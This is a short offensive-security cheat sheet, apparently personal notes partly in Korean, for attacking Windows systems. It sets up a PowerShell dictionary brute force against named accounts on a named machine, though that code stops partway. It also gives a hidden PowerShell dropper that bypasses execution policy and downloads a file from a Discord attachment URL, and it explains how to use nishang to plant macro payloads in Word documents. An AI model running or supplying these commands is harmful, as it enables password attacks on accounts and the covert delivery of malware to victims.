# Exploitation

## Brute Force (dictionary attack)
$userlist = "administrator", "amylo"
$passlist = Get-Content ./pass.txt
$computername = "Amylo-Surface8"

Add-Type -AssemblyName System.DirectoryService.AccountManagement

## Dropper
powershell.exe -executionPolicy bypass -windowStyle hidden -noprofile "& {(new-object system.net.webclient).downloadfile('https://media.discordapp.net/attachments/1094334210023628890/1134460777475092640/image.png?width=1079&height=495', './test.png')}"

## Client Side Attack

# nishang을 활용하여 out-word를 하면 word 파일에 페이로드를 삽입해 준다.
# 워드 안에 매크로를 넣어 준다. 단 매크로 삽입 실행 방지가 되어 있으면 실행할 수 없다.
# 페이로드에 드로퍼와 드로퍼 실행 페이로드를 넣으면 클라이언트 공격을 할 수 있다.

